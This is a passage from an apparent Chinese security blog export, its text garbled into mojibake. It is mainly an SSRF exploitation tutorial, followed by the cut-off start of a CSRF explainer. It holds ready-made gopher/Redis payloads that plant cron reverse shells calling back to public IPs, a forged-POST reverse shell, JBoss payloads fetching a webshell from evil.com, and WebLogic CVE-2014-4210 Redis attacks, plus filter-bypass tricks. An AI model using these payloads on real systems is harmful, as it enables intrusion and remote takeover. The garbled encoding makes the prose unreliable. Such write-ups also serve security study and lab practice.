è¾“å…¥ç½‘å€çš„åœ°æ–¹å’Œå¯ä»¥è¾“å…¥ipçš„åœ°æ–¹ã€‚ ï¼ˆ2ï¼‰ä»URLå…³é”®å­—ä¸­å¯»æ‰¾sharewapurllinksrcsourcetargetu3gdisplaysourceURlimageURLdomain...... å…­ã€SSRFæ¼æ´åˆ©ç”¨1ã€æœ¬åœ°åˆ©ç”¨&emsp;&emsp;ä»¥curlä¸¾ä¾‹ï¼ŒæŸ¥çœ‹ curl æ”¯æŒçš„åè®®åˆ—è¡¨ curl -V ï¼ˆ1ï¼‰ä½¿ç”¨fileåè®® file protocol (ä»»æ„æ–‡ä»¶è¯»å–)curl -v &#x27;file:///etc/passwd&#x27; ï¼ˆ2ï¼‰ä½¿ç”¨dictåè®® dict protocol (è·å–Redisé…ç½®ä¿¡æ¯)curl -v &#x27;dict://127.0.0.1:6379/info&#x27; ï¼ˆ3ï¼‰ä½¿ç”¨Gopheråè®®(ä¿—ç§°ä¸‡èƒ½åè®®) gopher protocol (ä¸€é”®åå¼¹Bash)curl -v &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27; 2ã€è¿œç¨‹åˆ©ç”¨ï¼ˆ1ï¼‰ç¯å¢ƒæ”»å‡»æœºipï¼š192.168.201.129ã€121.36.67.230æ”»å‡»æœºï¼šKaliã€å…¬ç½‘æœåŠ¡å™¨è¿œç¨‹æœåŠ¡å™¨ipï¼š39.x.x.xdockeré•œåƒï¼šssrf_redisPHPç‰ˆæœ¬ï¼šPHP Version 7.2.28(5.6ç‰ˆæœ¬æµ‹è¯•ä¼šå¤±è´¥) &emsp;&emsp;å…³é—­äº†é˜²è·¨ç«™æ”»å‡» ï¼ˆ2ï¼‰è¿œç¨‹åˆ©ç”¨ç¤ºä¾‹ä»£ç &emsp;&emsp;ssrf.php &lt;?php$ch = curl_init(); //åˆ›å»ºæ–°çš„ cURL èµ„æºcurl_setopt($ch, CURLOPT_URL, $_GET[&#x27;url&#x27;]); //è®¾ç½®URL å’Œç›¸åº”çš„é€‰é¡¹#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0);#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);curl_exec($ch); //æŠ“å– URL å†…å®¹å¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨ï¼Œå­˜å‚¨è¿›æ–‡ä»¶curl_close($ch); //å…³é—­ cURL èµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº?&gt; &emsp;&emsp;post.php &lt;html&gt;&lt;head&gt; &lt;title&gt;post&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php echo $_REQUEST[cmd]; ?&gt;&lt;/body&gt;&lt;/html&gt; ï¼ˆ3ï¼‰è¿œç¨‹åˆ©ç”¨æ–¹å¼aã€åˆ©ç”¨fileåè®®&emsp;&emsp;ä»»æ„æ–‡ä»¶è¯»å– curl -v &#x27;http://ssrf.xxx.com/ssrf.php?url=file:///etc/passwd&#x27; bã€åˆ©ç”¨dictåè®®ï¼ˆ1ï¼‰æŸ¥çœ‹ç«¯å£åŠç«¯å£ä¸Šè¿è¡ŒæœåŠ¡çš„ç‰ˆæœ¬ä¿¡æ¯ curl -v &#x27;http://ssrf.xxx.com/ssrf.php?url=dict://127.0.0.1:22/&#x27; &emsp;&emsp;è¯´æ˜22ç«¯å£å¼€æ”¾ ï¼ˆ2ï¼‰é€šè¿‡dictåè®®GetShell&emsp;&emsp;æœ‰å…³dictåè®®ï¼šå‘æœåŠ¡å™¨çš„ç«¯å£è¯·æ±‚ å‘½ä»¤:å‚æ•°ï¼Œå¹¶åœ¨æœ«å°¾è‡ªåŠ¨è¡¥ä¸Š\\r\\n(CRLF)ã€‚ &emsp;&emsp;dictåè®®è¦ä¸€æ¡ä¸€æ¡çš„æ‰§è¡Œï¼Œè€ŒGopheråè®®æ‰§è¡Œä¸€æ¡å‘½ä»¤å°±è¡Œäº†ã€‚ cã€åˆ©ç”¨Gopheråè®®ï¼ˆ1ï¼‰æ”»å‡»å†…ç½‘Rediså¹¶åå¼¹shell&emsp;&emsp;åˆ©ç”¨Redisæœªæˆæƒè®¿é—®æ”»å‡»Redis &emsp;&emsp;æ”»å‡»Redisçš„exp echo -e &quot;\\n\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.67.230/5555 0&gt;&amp;1\\n\\n\\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quitbash shell.sh 39.x.x.x 6379 &emsp;&emsp;ä»è€Œæ•è·åˆ°æ•°æ®ï¼Œå¹¶è¿›è¡Œè½¬æ¢ï¼Œè½¬æ¢è§„åˆ™å¦‚ä¸‹ï¼š å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯&gt;æˆ–è€…&lt;é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¯·æ±‚å’Œè¿”å›çš„æ—¶é—´ã€‚å¦‚æœå‰3ä¸ªå­—ç¬¦æ˜¯+OK é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¿”å›çš„å­—ç¬¦ä¸²ã€‚å°†\\rå­—ç¬¦ä¸²æ›¿æ¢æˆ%0d%0aç©ºç™½è¡Œæ›¿æ¢ä¸º%0a &emsp;&emsp;ç»“åˆGopheråè®®æ”»å‡»å†…ç½‘Redisï¼Œä½¿ç”¨ä¸Šè¾¹æ•è·æ•°æ®çš„è½¬æ¢ç»“æœå³å¯ï¼Œç„¶åè¿›è¡Œåå¼¹Shellï¼š curl -v &#x27;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.4:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f5555%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#x27; &emsp;&emsp;åå¼¹æˆåŠŸ http://39.x.x.x:8000/ssrf.phpæ˜¯å­˜åœ¨SSRFæ¼æ´çš„WebæœåŠ¡192.168.1.4æ˜¯redisåº”ç”¨æ‰€åœ¨å†…ç½‘ip121.36.67.230æ˜¯å…¬ç½‘æœåŠ¡å™¨ï¼Œæ¥æ”¶åå¼¹shell ï¼ˆ2ï¼‰ä¼ªé€ POSTè¯·æ±‚åå¼¹Shellcurl -v &#x27;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.5:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%2039.105.93.165%250d%250aUser-Agent:%20curl/7.58.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd%3Dccccc%250d%250a%250d%250abash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f4444%200%3E%261&#x27; &emsp;&emsp;åå¼¹æˆåŠŸ 192.168.1.5æ˜¯å†…ç½‘WebæœåŠ¡ï¼Œæœ‰post.php dã€åˆ©ç”¨http/såè®®ï¼ˆ1ï¼‰æ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´» &emsp;&emsp;è¯´æ˜å†…ç½‘ipä¸º192.168.1.3çš„ä¸»æœºå­˜æ´» ï¼ˆ2ï¼‰ç«¯å£æ‰«æhttp://example.com/ssrf.php?url=http://192.168.0.108:21/http://example.com/ssrf.php?url=http://192.168.0.108:22/http://example.com/ssrf.php?url=http://192.168.0.108:80/http://example.com/ssrf.php?url=http://192.168.0.108:443/http://example.com/ssrf.php?url=http://192.168.0.108:3306/ &emsp;&emsp;å¯é€šè¿‡åº”ç”¨å“åº”æ—¶é—´ã€è¿”å›çš„é”™è¯¯ä¿¡æ¯ï¼Œè¿”å›çš„æœåŠ¡Banneræ¥åˆ¤æ–­ç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œå¦‚å›¾æ‰€ç¤º &emsp;&emsp;ä¸Šé¢ä¸¤å¼ å›¾ä¸­ï¼Œå·¦ä¾§ä¸ºè®¿é—®22ç«¯å£å¹¶ä»é”™è¯¯ä¿¡æ¯ä¸­è¿”å›Bannerï¼Œå³ä¾§ä¸ºè®¿é—®21ç«¯å£è¢«æ‹’ç»ï¼ˆæœªå¼€æ”¾ï¼‰ã€‚å½“PHPæœªå¼€å¯æ˜¾é”™æ¨¡å¼æ—¶ï¼Œå¯é€šè¿‡å“åº”æ—¶é—´æ¥åˆ¤æ–­ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚æœ¬äººå®éªŒç»“æœæ˜¯å¼€æ”¾ç«¯å£å“åº”æ›´å¿«ã€‚ ï¼ˆ3ï¼‰å¯¹å†…ç½‘Webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«åŠæ”»å‡»å…¶ä¸­å­˜åœ¨æ¼æ´çš„åº”ç”¨&emsp;&emsp;å¤§å¤šæ•°Webåº”ç”¨éƒ½æœ‰ä¸€äº›ç‹¬ç‰¹çš„æ–‡ä»¶å’Œç›®å½•ï¼Œé€šè¿‡è¿™äº›æ–‡ä»¶å¯ä»¥è¯†åˆ«å‡ºåº”ç”¨çš„ç±»å‹ï¼Œç”šè‡³è¯¦ç»†çš„ç‰ˆæœ¬ã€‚åŸºäºæ­¤ç‰¹ç‚¹å¯åˆ©ç”¨SSRFæ¼æ´å¯¹å†…ç½‘Webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œå¦‚ä¸‹Payloadå¯ä»¥è¯†åˆ«ä¸»æœºæ˜¯å¦å®‰è£…äº†WordPress http://example.com/ssrf.php?url=https%3A%2F%2F127.0.0.1%3A443%2Fwp-content%2Fthemes%2Fdefault%2Faudio.jpghttp://example.com/ssrf.php?url=https://127.0.0.1:443/wp-content/themes/default/audio.jpg &emsp;&emsp;å¾—åˆ°åº”ç”¨æŒ‡çº¹åï¼Œä¾¿èƒ½æœ‰é’ˆå¯¹æ€§åœ°å¯¹å…¶å­˜åœ¨çš„æ¼æ´è¿›è¡Œåˆ©ç”¨ã€‚å¦‚ä¸‹Payloadå±•ç¤ºäº†å¦‚ä½•åˆ©ç”¨SSRFæ¼æ´æ”»å‡»å†…ç½‘çš„JBossåº”ç”¨ï¼š http://example.com/ssrf.php?url=https%3A%2F%2F127.0.0.1%3A8080%2Fjmx-console%2FHtmlAdaptor%3Faction%3DinvokeOp%26name%3Djboss.system%253Aservice%253DMainDeployer%26methodIndex%3D3%26arg0%3Dhttp%253A%252F%252Fevil.com%252Fwebshell.warhttp://example.com/ssrf.php?url=https://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.system%3Aservice%3DMainDeployer&amp;methodIndex=3&amp;arg0=http%3A%2F%2Fevil.com%2Fwebshell.warhttp://example.com/ssrf.php?url=https://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.system:service=MainDeployer&amp;methodIndex=3&amp;arg0=http://evil.com/webshell.war eã€å‘½ä»¤æ‰§è¡Œ&emsp;&emsp;PHPç¯å¢ƒä¸‹å¦‚æœå®‰è£…äº†expectæ‰©å±•ï¼Œè¿˜å¯ä»¥é€šè¿‡expectåè®®æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚ï¼š http://example.com/ssrf.php?url=expect://id ä¸ƒã€é˜²æŠ¤ç»•è¿‡1ã€å¸¸è§é˜²æŠ¤æ–¹å¼å¾ˆå¤šå¼€å‘è€…ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ç«¯æ–¹å¼å¯¹SSRFä¸­çš„è¯·æ±‚åœ°å€è¿›è¡Œè¿‡æ»¤ï¼Œå…·ä½“è¡¨ç°å¦‚ä¸‹ï¼š é™åˆ¶è¯·æ±‚ç‰¹å®šåŸŸå ç¦æ­¢è¯·æ±‚å†…ç½‘IP ç„¶è€Œï¼Œè¿™ä¸¤ç§è¿‡æ»¤éƒ½å¾ˆå®¹æ˜“è¢«ç»•è¿‡ï¼Œå¯ç”¨çš„æ–¹æ³•å…·ä½“å¦‚ä¸‹ï¼š 2ã€é˜²æŠ¤ç»•è¿‡ï¼ˆ1ï¼‰ä½¿ç”¨@&emsp;&emsp;ä½¿ç”¨ http://example.com@eval.com è¿™ç§æ ¼å¼æ¥ç»•è¿‡æ­£åˆ™ &emsp;&emsp;åœ¨å¯¹@è§£æåŸŸåä¸­ï¼Œä¸åŒçš„å¤„ç†å‡½æ•°å­˜åœ¨å¤„ç†å·®å¼‚ï¼Œå¦‚ï¼šhttp://www.aaa.com@www.bbb.com@www.ccc.comåœ¨PHPçš„parse_urlä¸­ä¼šè¯†åˆ«www.ccc.comï¼Œè€Œlibcurlåˆ™è¯†åˆ«ä¸ºwww.bbb.com ï¼ˆ2ï¼‰å¦ç±»IPåœ°å€å†™æ³•&emsp;&emsp;IPåœ°å€è½¬ä¸ºè¿›åˆ¶ï¼ˆå…«è¿›åˆ¶ã€åè¿›åˆ¶ã€åå…­è¿›åˆ¶ï¼‰åŠIPåœ°å€çœç•¥å†™æ³•ï¼Œä¸¾ä¾‹è¯´æ˜å¦‚ä¸‹ [+] 0177.000.00.01 å…«è¿›åˆ¶[+] 2130706433 åè¿›åˆ¶[+] 0x7f.0x0.0x0.0x1 åå…­è¿›åˆ¶[+] 127.1 IPåœ°å€çœç•¥å†™æ³•ä»¥ä¸Š4ç§å†™æ³•å‡å¯è¡¨ç¤º127.0.0.1 ï¼ˆ3ï¼‰é…ç½®åŸŸå&emsp;&emsp;å¦‚æœæˆ‘ä»¬æ‰‹ä¸­æœ‰å¯æ§åŸŸåï¼Œåˆ™å¯æ ¹æ®é‚£ä¸ªåŸŸåAè®°å½•æŒ‡å‘æ¬²è¯·æ±‚çš„IPè¿›è¡Œç»•è¿‡æ“ä½œï¼š evil.example.com =&gt; 10.0.18.3 &emsp;&emsp;æˆ–è€…åˆ©ç”¨DNSè§£æä¸ºæŒ‡å®šçš„åŸŸåï¼Œevil.example.comå¯ä»¥æŒ‡å‘ä»»æ„åŸŸå evil.example.com =&gt; heihei.com ï¼ˆ4ï¼‰åˆ©ç”¨[::]ç»•è¿‡localhost&emsp;&emsp;å¯ä»¥åˆ©ç”¨[::]æ¥ç»•è¿‡localhost http://[::]:80/ &gt;&gt;&gt; http://127.0.0.1 ï¼ˆ5ï¼‰æ·»åŠ ç«¯å£å·http://127.0.0.1:8080 ï¼ˆ6ï¼‰åˆ©ç”¨çŸ­ç½‘å€ ç«™é•¿å·¥å…·çŸ­ç½‘å€ ç™¾åº¦çŸ­ç½‘å€ ï¼ˆ7ï¼‰å¥å·127ã€‚0ã€‚0ã€‚1 &gt;&gt;&gt; 127.0.0.1 ï¼ˆ8ï¼‰302è·³è½¬&emsp;&emsp;ä½¿ç”¨https://tinyurl.comç”Ÿæˆ302è·³è½¬åœ°å€ 3ã€å¸¸è§ç»•è¿‡å½¢å¼ï¼ˆ1ï¼‰é™åˆ¶ä¸ºhttp://www.xxx.com åŸŸå&emsp;&emsp;é‡‡ç”¨httpåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ã€‚å³@ http://www.xxx.com@www.xxc.com ï¼ˆ2ï¼‰é™åˆ¶è¯·æ±‚IPä¸ä¸ºå†…ç½‘åœ°å€å½“ä¸å…è®¸ipä¸ºå†…ç½‘åœ°å€æ—¶ é‡‡å–çŸ­ç½‘å€ç»•è¿‡ é‡‡å–ç‰¹æ®ŠåŸŸå é‡‡å–è¿›åˆ¶è½¬æ¢ ï¼ˆ3ï¼‰é™åˆ¶è¯·æ±‚åªä¸ºHTTPåè®® é‡‡å–302è·³è½¬ é‡‡å–çŸ­åœ°å€ å…«ã€å®æˆ˜1ã€weblogic ssrfæ”»å‡»redisCVE-2014-4210 ä¸‹è½½åœ°å€ï¼šhttps://github.com/vulhub/vulhub/tree/master/weblogic/ssrf ç¼–è¯‘å¹¶å¯åŠ¨ç¯å¢ƒ docker-compose builddocker-compose up -d è®¿é—®http://your-ip:7001/uddiexplorer/ï¼Œæ— éœ€ç™»å½•å³å¯æŸ¥çœ‹uddiexploreråº”ç”¨ã€‚ SSRFæ¼æ´å­˜åœ¨äºhttp://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp ï¼ˆ1ï¼‰æŸ¥çœ‹ç«¯å£http://192.168.0.108:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001`ï¼Œè®¿é—®ä¸€ä¸ªå¯ä»¥è®¿é—®çš„`IP:PORT`ï¼Œå¦‚`http://127.0.0.1:7001`ï¼Œ è®¿é—®çš„ç«¯å£å°†ä¼šå¾—åˆ°é”™è¯¯ï¼Œä¸€èˆ¬æ˜¯è¿”å›`status code`ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œå¦‚æœè®¿é—®çš„éhttpåè®®ï¼Œåˆ™ä¼šè¿”å›`did not have a valid SOAP content-type ä¿®æ”¹ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„ç«¯å£ï¼Œå°†ä¼šè¿”å›could not connect over HTTP to server é€šè¿‡é”™è¯¯çš„ä¸åŒï¼Œå³å¯æ¢æµ‹å†…ç½‘çŠ¶æ€ã€‚ ï¼ˆ2ï¼‰æ³¨å…¥HTTPå¤´ï¼Œåˆ©ç”¨Redisåå¼¹shell&emsp;&emsp;Weblogicçš„SSRFæœ‰ä¸€ä¸ªæ¯”è¾ƒå¤§çš„ç‰¹ç‚¹ï¼Œå…¶è™½ç„¶æ˜¯ä¸€ä¸ªâ€œGETâ€è¯·æ±‚ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥%0a%0dæ¥æ³¨å…¥æ¢è¡Œç¬¦ï¼Œè€ŒæŸäº›æœåŠ¡ï¼ˆå¦‚redisï¼‰æ˜¯é€šè¿‡æ¢è¡Œç¬¦æ¥åˆ†éš”æ¯æ¡å‘½ä»¤ï¼Œä¹Ÿå°±è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥SSRFæ”»å‡»å†…ç½‘ä¸­çš„redisæœåŠ¡å™¨ã€‚ &emsp;&emsp;é¦–å…ˆï¼Œé€šè¿‡ssrfæ¢æµ‹å†…ç½‘ä¸­çš„redisæœåŠ¡å™¨ï¼ˆdockerç¯å¢ƒçš„ç½‘æ®µä¸€èˆ¬æ˜¯172.*ï¼‰ï¼Œå‘ç°172.18.0.2:6379å¯ä»¥è¿é€šï¼š å‘é€ä¸‰æ¡Rediså‘½ä»¤ï¼Œå°†åå¼¹shellè„šæœ¬å†™å…¥/etc/crontabå®šæ—¶ä»»åŠ¡ï¼š set 1 &quot;\\n\\n\\n\\n0-59 0-23 1-31 1-12 0-6 root bash -c &#x27;sh -i &gt;&amp; /dev/tcp/1.15.35.104/4444 0&gt;&amp;1&#x27;\\n\\n\\n\\n&quot;config set dir /etc/config set dbfilename crontabsave è¿›è¡Œurlç¼–ç ï¼š set%201%20%22%5cn%5cn%5cn%5cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#x27;sh%20-i%20%3e%26%20%2fdev%2ftcp%2fevil%2f21%200%3e%261&#x27;%5cn%5cn%5cn%5cn%22%0aconfig%20set%20dir%20%2fetc%2f%0aconfig%20set%20dbfilename%20crontab%0asave æ³¨æ„ï¼Œæ¢è¡Œç¬¦æ˜¯ \\r\\n ï¼Œä¹Ÿå°±æ˜¯ %0D%0A ã€‚ å°†urlç¼–ç åçš„å­—ç¬¦ä¸²æ”¾åœ¨ssrfçš„åŸŸååé¢ï¼Œå‘é€ï¼š http://192.168.0.108:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.18.0.2:6379/test/%0d%0a%0d%0aset%201%20%22%5cn%5cn%5cn%5cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#x27;sh%20-i%20%3e%26%20%2fdev%2ftcp%2fevil%2f21%200%3e%261&#x27;%5cn%5cn%5cn%5cn%22%0aconfig%20set%20dir%20%2fetc%2f%0aconfig%20set%20dbfilename%20crontab%0asave","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"SSRF","slug":"SSRF","permalink":"https://wolke.cn/tags/SSRF/"}],"author":"w01ke"},{"title":"CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»","slug":"CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»","date":"2022-01-31T08:27:30.000Z","updated":"2022-02-02T15:45:12.769Z","comments":true,"path":"post/ecd34c17.html","link":"","permalink":"https://wolke.cn/post/ecd34c17.html","excerpt":"","text":"ä¸€ã€CSRFä»‹ç»&emsp;&emsp;CSRFå…¨ç§°ä¸ºè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCross-site request forgeryï¼‰ï¼Œæ˜¯ä¸€ç§ç½‘ç»œæ”»å‡»æ–¹å¼ï¼Œä¹Ÿè¢«ç§°ä¸º one-click attack æˆ–è€… session ridingã€‚é€šå¸¸ç¼©å†™ä¸ºCSRFæˆ–è€…XSRFï¼Œæ˜¯ä¸€ç§å¯¹ç½‘ç«™çš„æ¶æ„åˆ©ç”¨ã€‚å°½ç®¡å¬èµ·æ¥åƒxssæ¼æ´ï¼Œä½†æ˜¯å®ƒä¸xssæ¼æ´éå¸¸ä¸åŒã€‚xssåˆ©ç”¨ç«™ç‚¹å†…çš„ä¿¡ä»»ç”¨æˆ·ï¼Œè€ŒCSRFåˆ™é€šè¿‡ä¼ªè£…æˆå—ä¿¡ä»»ç”¨æˆ·è¯·æ±‚å—ä¿¡ä»»çš„ç½‘ç«™ã€‚ä¸xssæ”»å‡»ç›¸æ¯”ï¼Œcsrfæ”»å‡»å¾€å¾€ä¸å¤§æµè¡Œï¼Œä¹Ÿéš¾ä»¥é˜²èŒƒï¼Œæ‰€ä»¥è®¤ä¸ºæ¯”xssæ¼æ´æ›´å…·å±é™©æ€§ äºŒã€CSRFæ¼æ´åŸç†&emsp;&emsp;CSRFæ”»å‡»åˆ©ç”¨ç½‘ç«™å¯¹äºç”¨æˆ·ç½‘é¡µæµè§ˆå™¨çš„ä¿¡ä»»ï¼ŒæŒŸæŒç”¨æˆ·å½“å‰å·²ç™»é™†çš„Webåº”ç”¨ç¨‹åºï¼Œå»æ‰§è¡Œå¹¶éç”¨æˆ·æœ¬æ„çš„æ“ä½œã€‚CSRFæ¼æ´èƒ½å¤Ÿåšçš„äº‹æƒ…åŒ…æ‹¬ï¼šä»¥ç›®æ ‡ç”¨æˆ·çš„åä¹‰å‘é€é‚®ä»¶ã€å‘æ¶ˆæ¯ã€ç›—å–ç›®æ ‡ç”¨æˆ·çš„è´¦å·ï¼Œç”šè‡³è´­ä¹°å•†å“ã€è™šæ‹Ÿè´§å¸è½¬è´¦ï¼Œè¿™ä¼šæ³„éœ²ä¸ªäººéšç§å¹¶å¨èƒåˆ°äº†ç›®æ ‡ç”¨æˆ·çš„è´¢äº§å®‰å…¨ Csrfæ¼æ´çš„æ”»å‡»è¿‡ç¨‹æœ‰ä¸¤ä¸ªé‡ç‚¹ï¼š ç›®æ ‡ç”¨æˆ·å·²ç»ç™»å½•äº†ç½‘ç«™ï¼Œèƒ½å¤Ÿæ‰§è¡Œç½‘ç«™çš„åŠŸèƒ½ ç›®æ ‡ç”¨æˆ·è®¿é—®äº†æ”»å‡»è€…æ„é€ çš„URL ä¸‰ã€CSRFæ”»å‡»å®ä¾‹1ã€è§’è‰² æ­£å¸¸æµè§ˆç½‘é¡µçš„ç”¨æˆ·ï¼šUser æ­£è§„çš„ä½†æ˜¯å…·æœ‰æ¼æ´çš„ç½‘ç«™ï¼šWebA åˆ©ç”¨CSRFè¿›è¡Œæ”»å‡»çš„ç½‘ç«™ï¼šWebB 2ã€æµç¨‹ï¼ˆ1ï¼‰æ­¥éª¤ä¸€&emsp;&emsp;ç”¨æˆ·ç™»å½•ã€æµè§ˆå¹¶ä¿¡ä»»æ­£è§„ç½‘ç«™WebAï¼ŒåŒæ—¶ï¼ŒWebAé€šè¿‡ç”¨æˆ·çš„éªŒè¯å¹¶åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­äº§ç”ŸCookieã€‚ ï¼ˆ2ï¼‰æ­¥éª¤äºŒ&emsp;&emsp;æ”»å‡»è€…WebBé€šè¿‡åœ¨WebAä¸­æ·»åŠ å›¾ç‰‡é“¾æ¥ç­‰æ–¹å¼è¯±å¯¼ç”¨æˆ·Userè®¿é—®ç½‘ç«™WebBã€‚ ï¼ˆ3ï¼‰æ­¥éª¤ä¸‰&emsp;&emsp;åœ¨ç”¨æˆ·Userè¢«è¯±å¯¼è®¿é—®WebBåï¼ŒWebBä¼šåˆ©ç”¨ç”¨æˆ·Userçš„æµè§ˆå™¨è®¿é—®ç¬¬ä¸‰æ–¹ç½‘ç«™WebAï¼Œå¹¶å‘å‡ºæ“ä½œè¯·æ±‚ã€‚ ï¼ˆ4ï¼‰æ­¥éª¤å››&emsp;&emsp;ç”¨æˆ·Userçš„æµè§ˆå™¨æ ¹æ®WebBçš„è¦æ±‚ï¼Œå¸¦ç€æ­¥éª¤ä¸€ä¸­äº§ç”Ÿçš„Cookieè®¿é—®WebAã€‚ ï¼ˆ5ï¼‰æ­¥éª¤äº”&emsp;&emsp;ç½‘ç«™WebAæ¥æ”¶åˆ°ç”¨æˆ·æµè§ˆå™¨çš„è¯·æ±‚ï¼ŒWebAæ— æ³•åˆ†è¾¨è¯·æ±‚ç”±ä½•å¤„å‘å‡ºï¼Œç”±äºæµè§ˆå™¨è®¿é—®æ—¶å¸¦ä¸Šç”¨æˆ·çš„Cookieï¼Œå› æ­¤WebAä¼šå“åº”æµè§ˆå™¨çš„è¯·æ±‚ï¼Œå¦‚æ­¤ä¸€æ¥ï¼Œæ”»å‡»ç½‘ç«™WebBå°±è¾¾åˆ°äº†æ¨¡æ‹Ÿç”¨æˆ·æ“ä½œçš„ç›®çš„ã€‚ å››ã€CSRFæ”»å‡»é˜²æŠ¤&emsp;&emsp;ä¸Šæ–‡ç®€å•çš„å™è¿°äº†CSRFæ”»å‡»çš„åŸç†ï¼Œæ¥ä¸‹æ¥å°†è¦ä»‹ç»å‡ ç§CSRFæ”»å‡»çš„é˜²æŠ¤æ–¹æ³•ã€‚ ï¼ˆ1ï¼‰éªŒè¯ç”¨æˆ·&emsp;&emsp;å½“ç”¨æˆ·å‘é€é‡è¦çš„è¯·æ±‚æ—¶éœ€è¦è¾“å…¥åŸå§‹å¯†ç æˆ–éªŒè¯ç  ï¼ˆ2ï¼‰é™åˆ¶è¯·æ±‚æ–¹å¼&emsp;&emsp;é™åˆ¶è¯·æ±‚æ–¹å¼åªèƒ½ä¸ºPOST ï¼ˆ3ï¼‰åªä½¿ç”¨JSON API&emsp;&emsp;ä½¿ç”¨JavaScriptå‘èµ·AJAXè¯·æ±‚æ˜¯é™åˆ¶è·¨åŸŸçš„ï¼Œå¹¶ä¸èƒ½é€šè¿‡ç®€å•çš„è¡¨å•æ¥å‘é€JSONï¼Œæ‰€ä»¥ï¼Œé€šè¿‡åªæ¥æ”¶JSONå¯ä»¥å¾ˆå¤§å¯èƒ½é¿å…CSRFæ”»å‡»ã€‚ ï¼ˆ4ï¼‰éªŒè¯HTTP Refererå­—æ®µï¼ˆåŒæºç­–ç•¥ï¼‰&emsp;&emsp;æ ¹æ® HTTP åè®®ï¼Œåœ¨ HTTP å¤´ä¸­æœ‰ä¸€ä¸ªå­—æ®µå« Refererï¼Œå®ƒè®°å½•äº†è¯¥ HTTP 